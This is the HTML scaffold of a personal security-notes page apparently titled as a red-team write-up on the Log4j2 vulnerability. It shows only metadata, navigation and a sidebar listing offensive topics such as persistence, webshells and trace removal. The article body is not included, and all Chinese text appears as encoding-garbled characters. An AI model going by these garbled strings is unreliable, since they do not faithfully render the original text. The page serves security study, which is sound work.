<!doctype html>
<html lang="zh-CN" data-theme="light">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width,initial-scale=1" />
    <meta name="generator" content="VuePress 2.0.0-rc.18" />
    <meta name="theme" content="VuePress Theme Hope 2.0.0-rc.27" />
    <style>
      html {
        background: var(--bg-color, #fff);
      }

      html[data-theme="dark"] {
        background: var(--bg-color, #1d1e1f);
      }

      body {
        background: var(--bg-color);
      }
    </style>
    <script>
      const userMode = localStorage.getItem("vuepress-theme-hope-scheme");
      const systemDarkMode =
        window.matchMedia &&
        window.matchMedia("(prefers-color-scheme: dark)").matches;

      if (userMode === "dark" || (userMode !== "light" && systemDarkMode)) {
        document.documentElement.setAttribute("data-theme", "dark");
      }
    </script>
    <meta property="og:url" content="https://echo0d.github.io/DailyNotes/CyberSecurity/RedTeam/2-WebVulnerability/log4j2/log4j2%20.html"><meta property="og:site_name" content="echo0d-notes"><meta property="og:title" content="webä¸»æµåº”ç”¨æ¼æ´-Log4j2"><meta property="og:description" content="webä¸»æµåº”ç”¨æ¼æ´-Log4j2 1. Apache Log4j2 ä»‹ç» 1.1 ä»€ä¹ˆæ˜¯Log4j2 åœ¨æ—¥å¸¸çš„å¼€å‘ï¼Œæµ‹è¯•å’Œç”Ÿäº§ç¯å¢ƒä¸­ï¼Œæ—¥å¿—è®°å½•äº†åº”ç”¨ï¼ŒæœåŠ¡è¿è¡Œè¿‡ç¨‹ä¸­çš„å…³é”®ä¿¡æ¯ï¼Œä»¥åŠå‡ºç°å¼‚å¸¸æ—¶çš„å †æ ˆï¼Œè¿™äº›ä¿¡æ¯å¸¸å¸¸ä½œä¸ºæŸ¥è¯¢ï¼Œå®šä½ï¼Œè§£å†³é—®é¢˜çš„å…³é”®ï¼Œå› æ­¤åœ¨ä»»ä½•ç³»ç»Ÿä¸­ï¼Œå¯¹æ—¥å¿—çš„ä½¿ç”¨å¾—å½“ï¼Œå°†æå¤§çš„æé«˜ç¨‹åºé—®é¢˜è§£å†³çš„æ•ˆç‡ã€‚ Apache Log4jæ˜¯ä¸€ä¸ªJava æ—¥..."><meta property="og:type" content="article"><meta property="og:locale" content="zh-CN"><meta property="og:updated_time" content="2024-11-15T10:05:31.000Z"><meta property="article:author" content="echo0d"><meta property="article:modified_time" content="2024-11-15T10:05:31.000Z"><script type="application/ld+json">{"@context":"https://schema.org","@type":"Article","headline":"webä¸»æµåº”ç”¨æ¼æ´-Log4j2","image":[""],"dateModified":"2024-11-15T10:05:31.000Z","author":[{"@type":"Person","name":"echo0d","url":""}]}</script><link rel="alternate" type="application/atom+xml" href="https://echo0d.github.io/DailyNotes/atom.xml" title="echo0d-notes Atom Feed"><link rel="alternate" type="application/json" href="https://echo0d.github.io/DailyNotes/feed.json" title="echo0d-notes JSON Feed"><link rel="alternate" type="application/rss+xml" href="https://echo0d.github.io/DailyNotes/rss.xml" title="echo0d-notes RSS Feed"><title>webä¸»æµåº”ç”¨æ¼æ´-Log4j2 | echo0d-notes</title><meta name="description" content="webä¸»æµåº”ç”¨æ¼æ´-Log4j2 1. Apache Log4j2 ä»‹ç» 1.1 ä»€ä¹ˆæ˜¯Log4j2 åœ¨æ—¥å¸¸çš„å¼€å‘ï¼Œæµ‹è¯•å’Œç”Ÿäº§ç¯å¢ƒä¸­ï¼Œæ—¥å¿—è®°å½•äº†åº”ç”¨ï¼ŒæœåŠ¡è¿è¡Œè¿‡ç¨‹ä¸­çš„å…³é”®ä¿¡æ¯ï¼Œä»¥åŠå‡ºç°å¼‚å¸¸æ—¶çš„å †æ ˆï¼Œè¿™äº›ä¿¡æ¯å¸¸å¸¸ä½œä¸ºæŸ¥è¯¢ï¼Œå®šä½ï¼Œè§£å†³é—®é¢˜çš„å…³é”®ï¼Œå› æ­¤åœ¨ä»»ä½•ç³»ç»Ÿä¸­ï¼Œå¯¹æ—¥å¿—çš„ä½¿ç”¨å¾—å½“ï¼Œå°†æå¤§çš„æé«˜ç¨‹åºé—®é¢˜è§£å†³çš„æ•ˆç‡ã€‚ Apache Log4jæ˜¯ä¸€ä¸ªJava æ—¥...">
    <link rel="preload" href="/DailyNotes/assets/style-CV2lW7Pe.css" as="style"><link rel="stylesheet" href="/DailyNotes/assets/style-CV2lW7Pe.css">
    <link rel="modulepreload" href="/DailyNotes/assets/app-HY2lwI8R.js"><link rel="modulepreload" href="/DailyNotes/assets/log4j2 .html-D4EETTP_.js"><link rel="modulepreload" href="/DailyNotes/assets/plugin-vue_export-helper-DlAUqK2U.js">
    <link rel="prefetch" href="/DailyNotes/assets/index.html-DQillI7i.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/index.html-Bxrq2fpF.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/DailySkills.html-w5vKwmvk.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/Treasure.html-EU0QClwq.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/1-FileSystem.html-DkZMZph-.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/2-commandExecute.html-aHI5H-DF.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/3-Database.html-BbIP_xJ_.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/4-JNDI.html-IRMr83Go.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/5-reflection.html-AEhdq5mD.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/6-ClassLoader.html-UBqXd5IJ.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/7-DynamicProxy.html-r5CS5c6f.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/1-JavaEE.html-DtS2zsMg.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/2-JavaMVC.html-CHs2hM9j.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/3-JavaWeb_Servlet.html-Dfju9l19.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/4-JavaWeb_filter.html-C0JbRxYo.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/5-JavaWeb_Listener.html-DagKQ2mf.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/6-CookieAndSession.html-Fx5A_-Kz.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/7-JSP.html-Des7I64t.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/JavaVul.html-CQ4dOJhY.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/deserialize.html-DfO4B3LU.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/GoVul.html-D-ttIqna.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/1-CTF_WEB.html-CFUN18sL.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/index.html-eguNWaca.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/ExecuteAssembly.html-Cy_z0hCi.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/RDI.html-DjjgmgSD.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/index.html-6v-BqQjE.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/index.html-BiKUgoTr.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/1_syntax.html-C6Wn2M2B.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/2_VariableTypes.html-CG0f0XHO.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/index.html-BdAHYuNB.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/index.html-CuZxfDkq.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/JSModularity.html-DgLU4m49.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/index.html-C_fiT5eM.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/React_Typescript_antd.html-fWSgw2mK.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/Vue.html-BC9eP1D1.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/1_JavaBase.html-B-eMWYEv.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/2_ObjectOriented.html-fWPvSQzw.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/3_CoreClass.html-JhmoLbGE.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/4_Exception.html-Cg0ygBzK.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/5_Reflection.html-4VTTbcr0.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/6_Annotation.html-BsA3z6Hz.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/7_Genericity.html-OHUeIdc7.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/8_Native.html-DRgLvWOG.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/index.html-DLZChtvX.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/test_django.html-DJj-4P6a.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/index.html-BQCQ09zi.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/anti-debug.html-DibvvNg9.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/index.html-C-1043fA.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/1_InformationGathering.html-B1B3Wu2M.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/2_Intranet_windows.html-3haOhZTQ.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/3_CDN.html-BgyC7hy9.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/1_LinuxPersistence.html-BlbYJo3O.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/2_WindowsPersistence.html-DPp0z2Ml.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/3_ProcessInjection.html-S46hhDv2.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/1_Linux.html-PHrhlEZb.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/2_Windows.html-bkDmdUjm.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/Intranet_tunnel.html-BqGwCgHR.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/Tamper.html-Wiq-LuV-.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/TracesRemoval.html-BRvyoK0A.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/Burpsuite.html-C0dsL69y.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/SQLmap.html-XieJI5SX.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/Tunnel.html-CfsXK48W.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/WebShell.html-Dw41WKAw.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/openwrt.html-C6Skdbze.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/1_GoFinal.html-CRWEtR0a.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/2_fscanPro.html-BVwLL6Up.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/index.html-Dw4mWpb2.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/index.html-Bwg__SHm.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/ch1.html-Dmx4v3q7.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/ch10.html-DbJdGo5E.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/ch11.html-CLQHeiFE.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/ch12.html-BTFbCd9t.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/ch2.html-f2bHdsQz.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/ch3.html-Dh5rXIBN.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/ch4.html-C0ZdDrr8.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/ch5.html-4za3NYUB.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/ch6.html-Dn84v5ar.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/ch7.html-Bo47BzRt.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/node_CVE-2017-14849.html-B7mCPI6M.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/tomcat_CVE-2017-12615.html-BOED8BJy.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/tomcat_CVE-2020-1938.html-C11Re_YK.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/weblogic_CVE-2017-10271.html-I_hX8Xem.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/weblogic_CVE-2018-2894.html-B14upGFa.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/weblogic_CVE-2020-14882.html-DDfm2j47.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/FastjsonVul.html-DaMTRyxU.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/shiro.html-Vzexd1I-.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/ååºåˆ—åŒ–_shiro_CVE-2019-12422_shiro721ååºåˆ—åŒ–å‘½ä»¤æ‰§è¡Œæ¼æ´.html-CSTnGvX8.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/æƒé™ç»•è¿‡_shiro_CVE-2020-11989_Apache Shiro782æƒé™ç»•è¿‡æ¼æ´.html-BGOMPvSP.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/æƒé™ç»•è¿‡_shiro_CVE-2020-13933_Apache Shiroæƒé™ç»•è¿‡æ¼æ´.html-mGgf9FwW.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/spring.html-BhYle4f6.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/spring_CVE-2018-1273_bypass.html-CfDbxvBN.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/supervisor_CVE-2017-11610.html-BKDGI4cK.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/xstream_CVE-2021-21351.html-CboKvKV0.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/C3.html-B-hlKPX2.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/CS.html-SXknlA9f.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/MSFUse.html-Cnmr5QHp.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/MSF_CS.html-BDcdtAk3.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/404.html-CDWa-ibl.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/index.html-7zXpEa39.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/index.html-DsSQKnhE.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/index.html-BIT8NaBX.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/index.html-C4h2V6Il.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/index.html-CFANNQuF.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/index.html-IEtmBm-i.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/index.html-rn5ELXoC.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/index.html-B_N2lLlS.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/index.html-B2AzavSK.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/index.html-C1mSGgKN.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/index.html-CxaeEXWl.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/index.html-DCDpxQon.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/index.html-DM2jV34T.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/index.html-BgG3hjU0.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/index.html-B9HXjuSl.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/index.html-4ULy1xe0.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/index.html-D8po-wj2.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/index.html-C7Th59lD.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/index.html-CUzCb4-7.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/index.html-CP85p8ZK.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/index.html-BcgKJuxl.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/index.html-B0yxAZWx.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/index.html-DaxZIe8O.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/index.html-D2fKRY0o.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/index.html-C4-8VgcJ.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/index.html-BJnG-4cf.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/index.html-DhGJJpOM.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/photoswipe.esm-CMg0yb1C.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/SearchResult-BVcywlXi.js" as="script"><link rel="prefetch" href="/DailyNotes/assets/setupDevtools-7MC2TMWH-CY-KjqEs.js" as="script">
  </head>
  <body>
    <div id="app"><!--[--><!--[--><!--[--><span tabindex="-1"></span><a href="#main-content" class="vp-skip-link sr-only">è·³è‡³ä¸»è¦å…§å®¹</a><!--]--><div class="theme-container has-toc"><!--[--><header id="navbar" class="vp-navbar"><div class="vp-navbar-start"><button type="button" class="vp-toggle-sidebar-button" title="Toggle Sidebar"><span class="icon"></span></button><!--[--><!----><!--]--><!--[--><a class="route-link vp-brand" href="/DailyNotes/"><img class="vp-nav-logo" src="/DailyNotes/logo.jpg" alt><!----><span class="vp-site-name hide-in-pad">echo0d-notes</span></a><!--]--><!--[--><!----><!--]--></div><div class="vp-navbar-center"><!--[--><!----><!--]--><!--[--><nav class="vp-nav-links"><div class="nav-item hide-in-mobile"><a class="route-link nav-link active" href="/DailyNotes/CyberSecurity/" aria-label="ç½‘ç»œå®‰å…¨"><span class="font-icon icon fa-fw fa-sm fas fa-laptop-code" style=""></span>ç½‘ç»œå®‰å…¨<!----></a></div><div class="nav-item hide-in-mobile"><a class="route-link nav-link" href="/DailyNotes/CodeAudittutorial/" aria-label="ä»£ç å®¡è®¡"><span class="font-icon icon fa-fw fa-sm fas fa-laptop-code" style=""></span>ä»£ç å®¡è®¡<!----></a></div><div class="nav-item hide-in-mobile"><a class="route-link nav-link" href="/DailyNotes/develop/" aria-label="å¼€å‘æŠ€æœ¯"><span class="font-icon icon fa-fw fa-sm fas fa-laptop-code" style=""></span>å¼€å‘æŠ€æœ¯<!----></a></div><div class="nav-item hide-in-mobile"><a class="route-link nav-link" href="/DailyNotes/others/" aria-label="å…¶ä»–éšç¬”"><span class="font-icon icon fa-fw fa-sm fas fa-laptop-code" style=""></span>å…¶ä»–éšç¬”<!----></a></div></nav><!--]--><!--[--><!----><!--]--></div><div class="vp-navbar-end"><!--[--><!----><!--]--><!--[--><!----><div class="nav-item vp-repo"><a class="vp-repo-link" href="https://github.com/echo0d/DailyNotes" target="_blank" rel="noopener noreferrer" aria-label="GitHub"><svg xmlns="http://www.w3.org/2000/svg" class="icon github-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="github icon" style="width:1.25rem;height:1.25rem;vertical-align:middle;"><path d="M511.957 21.333C241.024 21.333 21.333 240.981 21.333 512c0 216.832 140.544 400.725 335.574 465.664 24.49 4.395 32.256-10.07 32.256-23.083 0-11.69.256-44.245 0-85.205-136.448 29.61-164.736-64.64-164.736-64.64-22.315-56.704-54.4-71.765-54.4-71.765-44.587-30.464 3.285-29.824 3.285-29.824 49.195 3.413 75.179 50.517 75.179 50.517 43.776 75.008 114.816 53.333 142.762 40.79 4.523-31.66 17.152-53.377 31.19-65.537-108.971-12.458-223.488-54.485-223.488-242.602 0-53.547 19.114-97.323 50.517-131.67-5.035-12.33-21.93-62.293 4.779-129.834 0 0 41.258-13.184 134.912 50.346a469.803 469.803 0 0 1 122.88-16.554c41.642.213 83.626 5.632 122.88 16.554 93.653-63.488 134.784-50.346 134.784-50.346 26.752 67.541 9.898 117.504 4.864 129.834 31.402 34.347 50.474 78.123 50.474 131.67 0 188.586-114.73 230.016-224.042 242.09 17.578 15.232 33.578 44.672 33.578 90.454v135.85c0 13.142 7.936 27.606 32.854 22.87C862.25 912.597 1002.667 728.747 1002.667 512c0-271.019-219.648-490.667-490.71-490.667z"></path></svg></a></div><div class="nav-item hide-in-mobile"><button type="button" class="outlook-button" tabindex="-1" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" class="icon outlook-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="outlook icon"><path d="M224 800c0 9.6 3.2 44.8 6.4 54.4 6.4 48-48 76.8-48 76.8s80 41.6 147.2 0 134.4-134.4 38.4-195.2c-22.4-12.8-41.6-19.2-57.6-19.2C259.2 716.8 227.2 761.6 224 800zM560 675.2l-32 51.2c-51.2 51.2-83.2 32-83.2 32 25.6 67.2 0 112-12.8 128 25.6 6.4 51.2 9.6 80 9.6 54.4 0 102.4-9.6 150.4-32l0 0c3.2 0 3.2-3.2 3.2-3.2 22.4-16 12.8-35.2 6.4-44.8-9.6-12.8-12.8-25.6-12.8-41.6 0-54.4 60.8-99.2 137.6-99.2 6.4 0 12.8 0 22.4 0 12.8 0 38.4 9.6 48-25.6 0-3.2 0-3.2 3.2-6.4 0-3.2 3.2-6.4 3.2-6.4 6.4-16 6.4-16 6.4-19.2 9.6-35.2 16-73.6 16-115.2 0-105.6-41.6-198.4-108.8-268.8C704 396.8 560 675.2 560 675.2zM224 419.2c0-28.8 22.4-51.2 51.2-51.2 28.8 0 51.2 22.4 51.2 51.2 0 28.8-22.4 51.2-51.2 51.2C246.4 470.4 224 448 224 419.2zM320 284.8c0-22.4 19.2-41.6 41.6-41.6 22.4 0 41.6 19.2 41.6 41.6 0 22.4-19.2 41.6-41.6 41.6C339.2 326.4 320 307.2 320 284.8zM457.6 208c0-12.8 12.8-25.6 25.6-25.6 12.8 0 25.6 12.8 25.6 25.6 0 12.8-12.8 25.6-25.6 25.6C470.4 233.6 457.6 220.8 457.6 208zM128 505.6C128 592 153.6 672 201.6 736c28.8-60.8 112-60.8 124.8-60.8-16-51.2 16-99.2 16-99.2l316.8-422.4c-48-19.2-99.2-32-150.4-32C297.6 118.4 128 291.2 128 505.6zM764.8 86.4c-22.4 19.2-390.4 518.4-390.4 518.4-22.4 28.8-12.8 76.8 22.4 99.2l9.6 6.4c35.2 22.4 80 12.8 99.2-25.6 0 0 6.4-12.8 9.6-19.2 54.4-105.6 275.2-524.8 288-553.6 6.4-19.2-3.2-32-19.2-32C777.6 76.8 771.2 80 764.8 86.4z"></path></svg><div class="outlook-dropdown"><!----></div></button></div><!--[--><button type="button" class="search-pro-button" aria-label="æœç´¢"><svg xmlns="http://www.w3.org/2000/svg" class="icon search-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="search icon"><path d="M192 480a256 256 0 1 1 512 0 256 256 0 0 1-512 0m631.776 362.496-143.2-143.168A318.464 318.464 0 0 0 768 480c0-176.736-143.264-320-320-320S128 303.264 128 480s143.264 320 320 320a318.016 318.016 0 0 0 184.16-58.592l146.336 146.368c12.512 12.48 32.768 12.48 45.28 0 12.48-12.512 12.48-32.768 0-45.28"></path></svg><div class="search-pro-placeholder">æœç´¢</div><div class="search-pro-key-hints"><kbd class="search-pro-key">Ctrl</kbd><kbd class="search-pro-key">K</kbd></div></button><!--]--><!--]--><!--[--><!----><!--]--><button type="button" class="vp-toggle-navbar-button" aria-label="Toggle Navbar" aria-expanded="false" aria-controls="nav-screen"><span><span class="vp-top"></span><span class="vp-middle"></span><span class="vp-bottom"></span></span></button></div></header><!----><!--]--><!----><div class="toggle-sidebar-wrapper"><span class="arrow start"></span></div><aside id="sidebar" class="vp-sidebar"><!--[--><!----><!--]--><ul class="vp-sidebar-links"><li><section class="vp-sidebar-group"><p class="vp-sidebar-header clickable active"><!----><a class="route-link nav-link active vp-sidebar-title" href="/DailyNotes/CyberSecurity/" aria-label="ç½‘ç»œå®‰å…¨"><!---->ç½‘ç»œå®‰å…¨<!----></a><!----></p><ul class="vp-sidebar-links"><li><section class="vp-sidebar-group"><button class="vp-sidebar-header clickable" type="button"><!----><span class="vp-sidebar-title">CTFç¬”è®°</span><span class="vp-arrow end"></span></button><!----></section></li><li><section class="vp-sidebar-group"><button class="vp-sidebar-header clickable" type="button"><!----><span class="vp-sidebar-title">é˜²å¾¡è§„é¿</span><span class="vp-arrow end"></span></button><!----></section></li><li><section class="vp-sidebar-group"><button class="vp-sidebar-header clickable active" type="button"><!----><span class="vp-sidebar-title">åˆçº§çº¢é˜Ÿ</span><span class="vp-arrow down"></span></button><ul class="vp-sidebar-links"><li><a class="route-link nav-link vp-sidebar-link vp-sidebar-page" href="/DailyNotes/CyberSecurity/RedTeam/" aria-label="åˆçº§çº¢é˜Ÿ"><!---->åˆçº§çº¢é˜Ÿ<!----></a></li><li><section class="vp-sidebar-group"><button class="vp-sidebar-header clickable" type="button"><!----><span class="vp-sidebar-title">1 Information Gathering</span><span class="vp-arrow end"></span></button><!----></section></li><li><section class="vp-sidebar-group"><button class="vp-sidebar-header clickable active" type="button"><!----><span class="vp-sidebar-title">2 Web Vulnerability</span><span class="vp-arrow down"></span></button><ul class="vp-sidebar-links"><li><section class="vp-sidebar-group"><button class="vp-sidebar-header clickable" type="button"><!----><span class="vp-sidebar-title">Fastjson</span><span class="vp-arrow end"></span></button><!----></section></li><li><section class="vp-sidebar-group"><button class="vp-sidebar-header clickable active" type="button"><!----><span class="vp-sidebar-title">Log4j2</span><span class="vp-arrow down"></span></button><ul class="vp-sidebar-links"><li><a class="route-link nav-link active vp-sidebar-link vp-sidebar-page active" href="/DailyNotes/CyberSecurity/RedTeam/2-WebVulnerability/log4j2/log4j2%20.html" aria-label="webä¸»æµåº”ç”¨æ¼æ´-Log4j2"><!---->webä¸»æµåº”ç”¨æ¼æ´-Log4j2<!----></a></li></ul></section></li><li><section class="vp-sidebar-group"><button class="vp-sidebar-header clickable" type="button"><!----><span class="vp-sidebar-title">Node.js</span><span class="vp-arrow end"></span></button><!----></section></li><li><section class="vp-sidebar-group"><button class="vp-sidebar-header clickable" type="button"><!----><span class="vp-sidebar-title">Shiro</span><span class="vp-arrow end"></span></button><!----></section></li><li><section class="vp-sidebar-group"><button class="vp-sidebar-header clickable" type="button"><!----><span class="vp-sidebar-title">Spring</span><span class="vp-arrow end"></span></button><!----></section></li><li><section class="vp-sidebar-group"><button class="vp-sidebar-header clickable" type="button"><!----><span class="vp-sidebar-title">Supervisor</span><span class="vp-arrow end"></span></button><!----></section></li><li><section class="vp-sidebar-group"><button class="vp-sidebar-header clickable" type="button"><!----><span class="vp-sidebar-title">Tomcat</span><span class="vp-arrow end"></span></button><!----></section></li><li><section class="vp-sidebar-group"><button class="vp-sidebar-header clickable" type="button"><!----><span class="vp-sidebar-title">Weblogic</span><span class="vp-arrow end"></span></button><!----></section></li><li><section class="vp-sidebar-group"><button class="vp-sidebar-header clickable" type="button"><!----><span class="vp-sidebar-title">Xstream</span><span class="vp-arrow end"></span></button><!----></section></li></ul></section></li><li><section class="vp-sidebar-group"><button class="vp-sidebar-header clickable" type="button"><!----><span class="vp-sidebar-title">3 Persistence</span><span class="vp-arrow end"></span></button><!----></section></li><li><section class="vp-sidebar-group"><button class="vp-sidebar-header clickable" type="button"><!----><span class="vp-sidebar-title">4 Privilege Escalation</span><span class="vp-arrow end"></span></button><!----></section></li><li><section class="vp-sidebar-group"><button class="vp-sidebar-header clickable" type="button"><!----><span class="vp-sidebar-title">5 Intranet</span><span class="vp-arrow end"></span></button><!----></section></li><li><section class="vp-sidebar-group"><button class="vp-sidebar-header clickable" type="button"><!----><span class="vp-sidebar-title">6 Emergency</span><span class="vp-arrow end"></span></button><!----></section></li><li><section class="vp-sidebar-group"><button class="vp-sidebar-header clickable" type="button"><!----><span class="vp-sidebar-title">Tools</span><span class="vp-arrow end"></span></button><!----></section></li></ul></section></li></ul></section></li></ul><!--[--><!----><!--]--></aside><!--[--><main id="main-content" class="vp-page"><!--[--><!--[--><!----><!--]--><!----><nav class="vp-breadcrumb disable"></nav><div class="vp-page-title"><h1><!---->webä¸»æµåº”ç”¨æ¼æ´-Log4j2</h1><div class="page-info"><span class="page-author-info" aria-label="ä½œè€…ğŸ–Š" data-balloon-pos="down"><svg xmlns="http://www.w3.org/2000/svg" class="icon author-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="author icon"><path d="M649.6 633.6c86.4-48 147.2-144 147.2-249.6 0-160-128-288-288-288s-288 128-288 288c0 108.8 57.6 201.6 147.2 249.6-121.6 48-214.4 153.6-240 288-3.2 9.6 0 19.2 6.4 25.6 3.2 9.6 12.8 12.8 22.4 12.8h704c9.6 0 19.2-3.2 25.6-12.8 6.4-6.4 9.6-16 6.4-25.6-25.6-134.4-121.6-240-243.2-288z"></path></svg><span><span class="page-author-item">echo0d</span></span><span property="author" content="echo0d"></span></span><!----><span class="page-date-info" aria-label="å†™ä½œæ—¥æœŸğŸ“…" data-balloon-pos="down"><svg xmlns="http://www.w3.org/2000/svg" class="icon calendar-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="calendar icon"><path d="M716.4 110.137c0-18.753-14.72-33.473-33.472-33.473-18.753 0-33.473 14.72-33.473 33.473v33.473h66.993v-33.473zm-334.87 0c0-18.753-14.72-33.473-33.473-33.473s-33.52 14.72-33.52 33.473v33.473h66.993v-33.473zm468.81 33.52H716.4v100.465c0 18.753-14.72 33.473-33.472 33.473a33.145 33.145 0 01-33.473-33.473V143.657H381.53v100.465c0 18.753-14.72 33.473-33.473 33.473a33.145 33.145 0 01-33.473-33.473V143.657H180.6A134.314 134.314 0 0046.66 277.595v535.756A134.314 134.314 0 00180.6 947.289h669.74a134.36 134.36 0 00133.94-133.938V277.595a134.314 134.314 0 00-133.94-133.938zm33.473 267.877H147.126a33.145 33.145 0 01-33.473-33.473c0-18.752 14.72-33.473 33.473-33.473h736.687c18.752 0 33.472 14.72 33.472 33.473a33.145 33.145 0 01-33.472 33.473z"></path></svg><span><!----></span><meta property="datePublished" content="2024-11-15T10:05:31.000Z"></span><!----><span class="page-reading-time-info" aria-label="é˜…è¯»æ—¶é—´âŒ›" data-balloon-pos="down"><svg xmlns="http://www.w3.org/2000/svg" class="icon 